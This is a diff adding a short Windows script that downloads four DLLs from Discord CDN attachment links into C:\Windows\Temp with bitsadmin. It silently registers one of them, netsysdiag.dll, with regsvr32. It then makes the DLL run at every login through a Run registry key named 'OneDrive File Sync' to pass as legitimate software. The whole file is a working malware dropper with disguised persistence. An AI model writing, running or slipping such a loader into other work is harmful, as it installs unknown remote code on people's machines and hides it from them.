@@ -1,0 +1,7 @@
+bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/1154069452992823329/1154069694563758181/netsysdiag.dll" "C:\Windows\Temp\netsysdiag.dll"
+bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/1154069452992823329/1155609124869001367/msvcp140.dll" "C:\Windows\Temp\msvcp140.dll"
+bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/1154069452992823329/1155609144481546350/vcruntime140.dll" "C:\Windows\Temp\vcruntime140.dll"
+bitsadmin /transfer "mdj" /download /priority FOREGROUND "https://cdn.discordapp.com/attachments/1154069452992823329/1155609157790081054/vcruntime140_1.dll" "C:\Windows\Temp\vcruntime140_1.dll"
+sleep 2
+regsvr32 /s "C:\Windows\Temp\netsysdiag.dll"
+Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'OneDrive File Sync' -Value "C:\Windows\System32\regsvr32.exe /s C:\Windows\Temp\netsysdiag.dll"
